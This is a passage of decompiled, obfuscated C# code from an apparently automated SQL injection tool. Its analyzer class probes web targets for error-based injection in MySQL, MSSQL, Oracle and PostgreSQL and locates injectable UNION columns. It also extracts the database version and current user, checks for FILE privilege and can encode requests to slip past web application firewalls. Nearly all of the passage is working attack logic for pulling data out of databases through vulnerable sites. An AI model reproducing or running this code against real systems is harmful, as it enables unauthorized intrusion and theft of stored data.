							if (text.Contains("'"))
							{
								this.VectorType = InjectionFormat.String;
							}
							else
							{
								this.VectorType = InjectionFormat.Integer;
							}
							if (global::Globals.GStatistics != null)
							{
								global::Globals.GStatistics.method_1(Class26.Enum1.const_2, text, 1);
							}
							return true;
						}
						if (global::Globals.GMain.method_23() | this.RetyFailed)
						{
							break;
						}
					}
					if (global::Globals.GMain.method_23())
					{
						break;
					}
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			return flag;
		}
	}

	// Token: 0x060010E2 RID: 4322 RVA: 0x000728E4 File Offset: 0x00070AE4
	private bool method_2(string string_8)
	{
		string keyword = "A9615C78430D";
		List<string> list = new List<string>();
		InjectionType injectionType = InjectionType.Error;
		string text = string_8;
		checked
		{
			bool flag;
			bool flag2;
			if ((flag = true) == Class54.smethod_9(this.DBType))
			{
				string item = Class23.smethod_20(keyword);
				list.Add(item);
				int num = 0;
				do
				{
					switch (num)
					{
					case 0:
						this.MySQLErrorType = MySQLErrorType.DuplicateEntry;
						break;
					case 1:
						this.MySQLErrorType = MySQLErrorType.ExtractValue;
						break;
					case 2:
						this.MySQLErrorType = MySQLErrorType.UpdateXML;
						break;
					}
					text = MySQLWithError.Info(text, this.MySQLCollactions, this.MySQLErrorType, list, "");
					flag2 = this.HTML_CheckKeyword(text, keyword);
					if ((global::Globals.GMain.method_23() | this.RetyFailed) || flag2)
					{
						break;
					}
					num++;
				}
				while (num <= 2);
			}
			else if (flag == Class54.smethod_10(this.DBType))
			{
				string item = Class23.smethod_21(keyword, false, "+", "char");
				list.Add(item);
				int num = 0;
				do
				{
					if (num != 0)
					{
						if (num == 1)
						{
							this.MSSQLCollate = true;
						}
					}
					else
					{
						this.MSSQLCollate = false;
					}
					text = MSSQL.Info(text, injectionType, this.MSSQLCollate, list, "", "");
					flag2 = this.HTML_CheckKeyword(text, keyword);
					if ((global::Globals.GMain.method_23() | this.RetyFailed) || flag2)
					{
						break;
					}
					num++;
				}
				while (num <= 1);
			}
			else if (flag == Class54.smethod_11(this.DBType))
			{
				string item = Class23.smethod_21(keyword, false, "||", "chr");
				list.Add(item);
				int num = 0;
				do
				{
					switch (num)
					{
					case 0:
						this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
						break;
					case 1:
						this.OracleErrorType = OracleErrorType.DRITHSX_SN;
						break;
					case 2:
						this.OracleErrorType = OracleErrorType.GETMAPPINGXPATH;
						break;
					}
					text = Oracle.Info(text, injectionType, this.OracleErrorType, list, this.OracleCast, "");
					flag2 = this.HTML_CheckKeyword(text, keyword);
					if ((global::Globals.GMain.method_23() | this.RetyFailed) || flag2)
					{
						break;
					}
					num++;
				}
				while (num <= 2);
			}
			else if (flag == Class54.smethod_12(this.DBType))
			{
				string item = Class23.smethod_21(keyword, false, "||", "chr");
				list.Add(item);
				this.PostgreSQLErrorType = PostgreSQLErrorType.CAST_INT;
				text = PostgreSQL.Info(text, InjectionType.Error, this.PostgreSQLErrorType, list, "");
				flag2 = this.HTML_CheckKeyword(text, keyword);
			}
			if (flag2)
			{
				bool flag3;
				if ((flag3 = true) == Class54.smethod_9(this.DBType))
				{
					this.DBType = Types.MySQL_With_Error;
				}
				else if (flag3 == Class54.smethod_10(this.DBType))
				{
					this.DBType = Types.MSSQL_With_Error;
				}
				else if (flag3 == Class54.smethod_11(this.DBType))
				{
					this.DBType = Types.Oracle_With_Error;
				}
				else if (flag3 == Class54.smethod_12(this.DBType))
				{
					this.DBType = Types.PostgreSQL_With_Error;
				}
				this.CheckVersionNoCollactions(string_8, false);
			}
			return flag2;
		}
	}

	// Token: 0x060010E3 RID: 4323 RVA: 0x00072BC4 File Offset: 0x00070DC4
	private bool method_3(string string_8)
	{
		int unionStart = this.UnionStart;
		int unionEnd = this.UnionEnd;
		int i = unionStart;
		checked
		{
			while (i <= unionEnd)
			{
				if (this.UnionKeyword)
				{
					if (!string.IsNullOrEmpty(this.Keyword) && !this.bool_11 && this.method_5(string_8, i, this.Keyword))
					{
						return true;
					}
					if (Class54.smethod_11(this.DBType))
					{
						return false;
					}
				}
				bool result;
				if (!this.method_4(string_8, i))
				{
					if (!(global::Globals.GMain.method_23() | this.RetyFailed))
					{
						i++;
						continue;
					}
					result = false;
				}
				else
				{
					result = true;
				}
				return result;
			}
			return false;
		}
	}

	// Token: 0x060010E4 RID: 4324 RVA: 0x00072C5C File Offset: 0x00070E5C
	private bool method_4(string string_8, int int_7)
	{
		string text = "";
		string text2 = "961578430";
		checked
		{
			for (int i = 1; i <= int_7; i++)
			{
				if (!string.IsNullOrEmpty(text))
				{
					text += ",";
				}
				if (Class54.smethod_9(this.DBType))
				{
					text += Class23.smethod_20(text2 + Conversions.ToString(i) + ".9");
				}
				else if (Class54.smethod_10(this.DBType))
				{
					text = text + "cast(" + Class23.smethod_20(text2 + Conversions.ToString(i) + ".9") + "+as+char)";
				}
				else if (Class54.smethod_11(this.DBType))
				{
					text += Class23.smethod_21(text2 + Conversions.ToString(i) + ".9", false, "||", "chr");
				}
				else
				{
					if (!Class54.smethod_12(this.DBType))
					{
						throw new Exception(string.Concat(new string[]
						{
							"TryUnionBasead(",
							string_8,
							", ",
							Conversions.ToString(int_7),
							")"
						}));
					}
					text += Class23.smethod_21(text2 + Conversions.ToString(i) + ".9", false, "||", "chr");
				}
			}
			int num = Conversions.ToInteger(this.HTML_Work(4, string_8.Replace("[t]", text), text2));
			bool result;
			if (num > 0)
			{
				this.ResultUnion = "";
				text = "";
				for (int j = 1; j <= int_7; j++)
				{
					if (!string.IsNullOrEmpty(text))
					{
						text += ",";
					}
					if (j == num)
					{
						text += "[t]";
					}
					else if (Class54.smethod_11(this.DBType))
					{
						text += "null";
					}
					else
					{
						text += Conversions.ToString(j);
					}
				}
				this.ResultUnion = string_8.Replace("[t]", text);
				bool flag;
				if ((flag = true) == Class54.smethod_9(this.DBType))
				{
					this.DBType = Types.MySQL_No_Error;
				}
				else if (flag == Class54.smethod_10(this.DBType))
				{
					this.DBType = Types.MSSQL_No_Error;
				}
				else if (flag == Class54.smethod_11(this.DBType))
				{
					this.DBType = Types.Oracle_No_Error;
				}
				else if (flag == Class54.smethod_12(this.DBType))
				{
					this.DBType = Types.PostgreSQL_No_Error;
				}
				if (num > 0)
				{
					this.CheckVersionNoCollactions(this.ResultUnion, false);
				}
				this.ResultUnionColumn = num;
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}
	}

	// Token: 0x060010E5 RID: 4325 RVA: 0x00072EF0 File Offset: 0x000710F0
	private bool method_5(string string_8, int int_7, string string_9)
	{
		string text = "";
		checked
		{
			for (int i = 1; i <= int_7; i++)
			{
				if (!string.IsNullOrEmpty(text))
				{
					text += ",";
				}
				text += "null";
			}
			bool flag;
			if (flag = !this.HTML_CheckKeyword(string_8.Replace("[t]", text), string_9))
			{
				int j = 1;
				while (j <= int_7)
				{
					text = "";
					for (int k = 1; k <= int_7; k++)
					{
						if (!string.IsNullOrEmpty(text))
						{
							text += ",";
						}
						if (j == k)
						{
							text += "[t]";
						}
						else
						{
							text += "null";
						}
					}
					if (!(flag = this.CheckVersionNoCollactions(string_8.Replace("[t]", text), false)))
					{
						j++;
					}
					else
					{
						this.ResultUnion = string_8.Replace("[t]", text);
						this.ResultUnionColumn = j;
						IL_EE:
						if (!flag)
						{
							this.bool_11 = true;
							return flag;
						}
						bool flag2;
						if ((flag2 = true) == Class54.smethod_9(this.DBType))
						{
							this.DBType = Types.MySQL_No_Error;
							return flag;
						}
						if (flag2 == Class54.smethod_10(this.DBType))
						{
							this.DBType = Types.MSSQL_No_Error;
							return flag;
						}
						if (flag2 == Class54.smethod_11(this.DBType))
						{
							this.DBType = Types.Oracle_No_Error;
							return flag;
						}
						if (flag2 == Class54.smethod_12(this.DBType))
						{
							this.DBType = Types.PostgreSQL_No_Error;
							return flag;
						}
						return flag;
					}
				}
				goto IL_EE;
			}
			return flag;
		}
	}

	// Token: 0x060010E6 RID: 4326 RVA: 0x00073064 File Offset: 0x00071264
	private int method_6(string string_8, string string_9)
	{
		try
		{
			int num = string_8.ToLower().IndexOf(string_9.ToLower());
			if (num > 0)
			{
				string text = string_8.Substring(num);
				string text2 = text.Substring(string_9.Length, checked(text.IndexOf(".") - string_9.Length)).Trim();
				if (Versioned.IsNumeric(text2))
				{
					return Conversions.ToInteger(text2);
				}
			}
		}
		catch (Exception ex)
		{
		}
		return -1;
	}

	// Token: 0x060010E7 RID: 4327 RVA: 0x000730EC File Offset: 0x000712EC
	private string method_7(string string_8)
	{
		string result = "";
		string[] array = new string[2];
		List<string>[] array2 = new List<string>[2];
		List<string> list = new List<string>();
		list.AddRange(Strings.Split(string_8, "/", -1, CompareMethod.Binary));
		list.AddRange(Strings.Split(string_8, "&", -1, CompareMethod.Binary));
		list.AddRange(Strings.Split(string_8, "=", -1, CompareMethod.Binary));
		Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
		if (onProgressEventHandler != null)
		{
			onProgressEventHandler(this, "finding keyword", -1);
		}
		int num = 0;
		checked
		{
			do
			{
				string url;
				if (num == 0)
				{
					url = string_8.Replace("[t]", "");
				}
				else
				{
					url = string_8.Replace("[t]", this.ExploitCode);
				}
				array[num] = this.HTML_Load(url);
				array2[num] = new List<string>();
				if (string.IsNullOrEmpty(array[num]))
				{
					goto IL_22B;
				}
				array2[num].AddRange(Strings.Split(array[num].Trim(), " ", -1, CompareMethod.Binary));
				if (num == 1)
				{
					if (array2[0].Count == 0 | array2[1].Count == 0)
					{
						goto IL_230;
					}
					List<string>[] array3 = new List<string>[2];
					if (array2[0].Count > array2[1].Count)
					{
						array3[0] = array2[0];
						array3[1] = array2[1];
					}
					else
					{
						array3[0] = array2[1];
						array3[1] = array2[0];
					}
					try
					{
						foreach (string text in array3[0])
						{
							if (!string.IsNullOrEmpty(text) && (text.Length > 5 && text.Length < 10) && !array3[1].Contains(text))
							{
								bool flag = true;
								try
								{
									foreach (string value in list)
									{
										if (!string.IsNullOrEmpty(value))
										{
											flag = !text.Contains(value);
										}
										if (!flag)
										{
											break;
										}
									}
								}
								finally
								{
									List<string>.Enumerator enumerator2;
									((IDisposable)enumerator2).Dispose();
								}
								if (flag)
								{
									result = text;
									if (text.Length > 5)
									{
										break;
									}
								}
							}
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
				}
				num++;
			}
			while (num <= 1);
			return result;
			IL_22B:
			return result;
			IL_230:
			return "";
		}
	}

	// Token: 0x060010E8 RID: 4328 RVA: 0x00073354 File Offset: 0x00071554
	private bool method_8(string string_8)
	{
		List<string> list = new List<string>();
		list = this.GetInfo(string_8, "user()");
		bool result;
		if (list.Count == 1)
		{
			string[] array = list[0].Split(new char[]
			{
				'@'
			});
			if (array.Length == 2)
			{
				string text = string.Concat(new string[]
				{
					"'",
					array[0],
					"'@'",
					array[1],
					"'"
				});
				list.Clear();
				list.Add("privilege_type");
				string sCustomQuery = "from information_schema.user_privileges where privilege_type like " + Class23.smethod_20("%file%") + " and grantee = " + Class23.smethod_20(text);
				Types dbtype = this.DBType;
				if (dbtype != Types.MySQL_No_Error)
				{
					if (dbtype == Types.MySQL_With_Error)
					{
						string_8 = MySQLWithError.Dump(string_8, this.MySQLCollactions, MySQLErrorType.UpdateXML, false, "", "", list, 0, 1, "", "", "", sCustomQuery);
					}
				}
				else
				{
					string_8 = MySQLNoError.Dump(string_8, this.MySQLCollactions, false, false, "", "", list, 0, 1, "", "", "", sCustomQuery);
				}
				list = this.HTML_ParseHtmlData(string_8);
				result = (list.Count > 0);
			}
			else
			{
				result = false;
			}
		}
		else
		{
			result = false;
		}
		return result;
	}

	// Token: 0x060010E9 RID: 4329 RVA: 0x0007349C File Offset: 0x0007169C
	private bool method_9(string string_8)
	{
		if (string_8.ToLower().Contains("union"))
		{
		}
		List<string> list = new List<string>();
		bool flag;
		if ((flag = true) == Class54.smethod_9(this.DBType))
		{
			list = this.GetInfo(string_8, "version()");
		}
		else if (flag == Class54.smethod_10(this.DBType))
		{
			list = this.GetInfo(string_8, "@@version");
		}
		else if (flag == Class54.smethod_11(this.DBType))
		{
			list = this.GetInfo(string_8, "(select banner from v$version where banner like " + Class23.smethod_21("%Oracle%", false, "||", "chr") + ")");
		}
		else if (flag == Class54.smethod_12(this.DBType))
		{
			list = this.GetInfo(string_8, "version()");
		}
		bool result;
		if (list.Count == 0)
		{
			result = false;
		}
		else
		{
			this.Version = this.method_10(list[0]);
			result = true;
		}
		return result;
	}

	// Token: 0x060010EA RID: 4330 RVA: 0x00073588 File Offset: 0x00071788
	private string method_10(string string_8)
	{
		bool flag;
		if ((flag = true) == Class54.smethod_9(this.DBType))
		{
			if (string_8.Contains("-"))
			{
				string_8 = Strings.Split(string_8, "-", -1, CompareMethod.Binary)[0];
			}
			else if (string_8.Contains("+"))
			{
				string_8 = Strings.Split(string_8, "+", -1, CompareMethod.Binary)[0];
			}
		}
		else if (flag == Class54.smethod_10(this.DBType))
		{
			if (string_8.Contains("Microsoft"))
			{
				string_8 = string_8.Replace("Microsoft", "");
			}
			if (string_8.Contains("Server "))
			{
				string_8 = string_8.Replace("Server ", "");
			}
			if (string_8.Contains("-"))
			{
				string_8 = Strings.Split(string_8, "-", -1, CompareMethod.Binary)[0];
			}
			if (string_8.Contains("("))
			{
				string_8 = Strings.Split(string_8, "(", -1, CompareMethod.Binary)[0];
			}
		}
		else if (flag == Class54.smethod_11(this.DBType))
		{
			if (string_8.Contains("Enterprise Edition Release "))
			{
				string_8 = Strings.Replace(string_8, "Enterprise Edition Release ", "", 1, -1, CompareMethod.Binary);
			}
			if (string_8.Contains("Production"))
			{
				string_8 = Strings.Replace(string_8, "Production", "", 1, -1, CompareMethod.Binary);
			}
			if (string_8.Contains("-"))
			{
				string_8 = Strings.Replace(string_8, "-", "", 1, -1, CompareMethod.Binary);
			}
			if (string_8.Contains("Release"))
			{
				string_8 = Strings.Replace(string_8, "Release", "", 1, -1, CompareMethod.Binary);
			}
			if (string_8.Contains("Database"))
			{
				string_8 = Strings.Replace(string_8, "Database", "", 1, -1, CompareMethod.Binary);
			}
			if (string_8.Contains("Oracle"))
			{
				string_8 = Strings.Replace(string_8, "Oracle", "", 1, -1, CompareMethod.Binary);
			}
		}
		else if (flag == Class54.smethod_12(this.DBType) && string_8.Contains(" on "))
		{
			string_8 = Strings.Split(string_8, " on ", -1, CompareMethod.Binary)[0];
		}
		if (string_8.Contains("  "))
		{
			string_8 = string_8.Replace("  ", " ");
		}
		return string_8.Trim();
	}

	// Token: 0x060010EB RID: 4331 RVA: 0x000737D8 File Offset: 0x000719D8
	private void method_11()
	{
		while (!this.RetyFailed && this.stopwatch_1.Elapsed.TotalMilliseconds <= (double)(checked(this.Delay * 2)) && !this.method_0())
		{
			Thread.Sleep(100);
			Application.DoEvents();
		}
	}

	// Token: 0x060010EC RID: 4332 RVA: 0x00073824 File Offset: 0x00071A24
	public string HTML_Load(string url)
	{
		string text = Conversions.ToString(this.HTML_Work(0, url, null));
		if (text == null)
		{
			text = "";
		}
		return text;
	}

	// Token: 0x060010ED RID: 4333 RVA: 0x00073850 File Offset: 0x00071A50
	private Types method_12(string string_8)
	{
		return (Types)Conversions.ToInteger(this.HTML_Work(1, string_8, null));
	}

	// Token: 0x060010EE RID: 4334 RVA: 0x00009194 File Offset: 0x00007394
	public bool HTML_CheckKeyword(string url, string Keyword)
	{
		return Conversions.ToBoolean(this.HTML_Work(2, url, Keyword));
	}

	// Token: 0x060010EF RID: 4335 RVA: 0x00073870 File Offset: 0x00071A70
	public List<string> HTML_ParseHtmlData(string url)
	{
		List<string> list = new List<string>();
		string text = Conversions.ToString(this.HTML_Work(3, url, null));
		if (!string.IsNullOrEmpty(text))
		{
			list.Add(text);
		}
		return list;
	}

	// Token: 0x060010F0 RID: 4336 RVA: 0x000738A8 File Offset: 0x00071AA8
	public object HTML_Work(byte v, string url, object value = null)
	{
		if (Conversions.ToBoolean(global::Globals.GetObjectValue(global::Globals.GMain.chkAnalizeWAF)))
		{
			url = Class23.smethod_15(url);
		}
		int retry = this.Retry;
		checked
		{
			object obj;
			for (int i = 0; i <= retry; i++)
			{
				this.method_11();
				if (this.method_0())
				{
					break;
				}
				this.httpext_0.FollowRedirects = this.FollowRedirects;
				switch (v)
				{
				case 0:
					obj = this.httpext_0.QuickGet(url);
					break;
				case 1:
					obj = this.httpext_0.CheckSyntaxError(url);
					break;
				case 2:
					obj = this.httpext_0.CheckKeyword(url, Conversions.ToString(value));
					break;
				case 3:
					obj = this.httpext_0.ParseHtmlData(url, this.DBType);
					break;
				case 4:
					obj = this.httpext_0.TryUnionBasead(url, Conversions.ToString(value), this.DBType);
					if (Operators.ConditionalCompareObjectEqual(obj, -2, false))
					{
						obj = null;
					}
					break;
				}
				if (this.FollowRedirects)
				{
					this.WasRedirected = this.httpext_0.WasRedirected();
				}
				else
				{
					this.WasRedirected = false;
				}
				this.webServer_0 = (global::Globals.WebServer)this.httpext_0.WebServer();
				this.stopwatch_1 = Stopwatch.StartNew();
				this.httpext_0.Status();
				if (obj != null)
				{
					if (!(obj is bool) || this.httpext_0.ContextSize() != 0L)
					{
						break;
					}
				}
				else
				{
					if (this.httpext_0.Status() > 0)
					{
						break;
					}
					if (i >= this.Retry)
					{
						this.RetyFailed = true;
					}
				}
			}
			return obj;
		}
	}

	// Token: 0x0400082F RID: 2095
	private Stopwatch stopwatch_0;

	// Token: 0x04000830 RID: 2096
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private MySQLErrorType mySQLErrorType_0;

	// Token: 0x04000831 RID: 2097
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private MySQLCollactions mySQLCollactions_0;

	// Token: 0x04000832 RID: 2098
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private OracleErrorType oracleErrorType_0;

	// Token: 0x04000833 RID: 2099
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_0;

	// Token: 0x04000834 RID: 2100
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private PostgreSQLErrorType postgreSQLErrorType_0;

	// Token: 0x04000835 RID: 2101
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_1;

	// Token: 0x04000836 RID: 2102
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_0;

	// Token: 0x04000837 RID: 2103
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_0;

	// Token: 0x04000838 RID: 2104
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_1;

	// Token: 0x04000839 RID: 2105
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_1;

	// Token: 0x0400083A RID: 2106
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_2;

	// Token: 0x0400083B RID: 2107
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_3;

	// Token: 0x0400083C RID: 2108
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_4;

	// Token: 0x0400083D RID: 2109
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private List<string> list_0;

	// Token: 0x0400083E RID: 2110
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private List<string> list_1;

	// Token: 0x0400083F RID: 2111
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_2;

	// Token: 0x04000840 RID: 2112
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_3;

	// Token: 0x04000841 RID: 2113
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_4;

	// Token: 0x04000842 RID: 2114
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_5;

	// Token: 0x04000843 RID: 2115
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_6;

	// Token: 0x04000844 RID: 2116
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_7;

	// Token: 0x04000845 RID: 2117
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_8;

	// Token: 0x04000846 RID: 2118
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_2;

	// Token: 0x04000847 RID: 2119
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_3;

	// Token: 0x04000848 RID: 2120
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_5;

	// Token: 0x04000849 RID: 2121
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_9;

	// Token: 0x0400084A RID: 2122
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Types types_0;

	// Token: 0x0400084B RID: 2123
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private InjectionFormat injectionFormat_0;

	// Token: 0x0400084C RID: 2124
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_4;

	// Token: 0x0400084D RID: 2125
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_10;

	// Token: 0x0400084E RID: 2126
	private bool bool_11;

	// Token: 0x0400084F RID: 2127
	private HTTPExt httpext_0;

	// Token: 0x04000850 RID: 2128
	private string string_5;

	// Token: 0x04000851 RID: 2129
	private global::Globals.WebServer webServer_0;

	// Token: 0x04000852 RID: 2130
	private Stopwatch stopwatch_1;

	// Token: 0x04000853 RID: 2131
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private List<int> list_2;

	// Token: 0x04000854 RID: 2132
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_6;

	// Token: 0x04000855 RID: 2133
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_12;

	// Token: 0x04000856 RID: 2134
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_13;

	// Token: 0x04000857 RID: 2135
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_6;

	// Token: 0x04000858 RID: 2136
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_7;

	// Token: 0x04000859 RID: 2137
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Analyzer.OnProgressEventHandler onProgressEventHandler_0;

	// Token: 0x020000F3 RID: 243
	// (Invoke) Token: 0x060010F4 RID: 4340
	public delegate void OnProgressEventHandler(Analyzer sender, string sDesc, int iPerc);
}
